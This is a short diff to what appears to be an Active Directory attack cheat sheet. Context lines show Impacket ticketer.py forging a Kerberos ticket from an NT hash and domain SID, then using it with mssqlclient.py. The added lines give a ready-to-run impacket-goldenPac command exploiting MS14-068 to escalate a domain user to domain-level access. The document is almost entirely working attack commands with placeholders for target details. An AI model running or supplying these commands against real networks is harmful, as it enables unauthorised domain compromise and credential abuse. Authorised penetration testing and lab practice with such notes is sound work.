@@ -52,3 +52,9 @@ ticketer.py -nthash $HASH -domainsid $DOMAINSID -domain $DOMAIN -spn AnyName/$DC
 ```shell
 KRB5CCNAME=administrator.ccache mssqlclient.py -k administrator@$DCDOMAIN
 ```
+
+GoldenPAC ms14-068
+
+```bash
+impacket-goldenPac -dc-ip $TARGET_IP -target-ip $TARGET_IP '$DOMAIN/$USER:$PASSWORD@$MACHINE.$DOMAIN'
+```
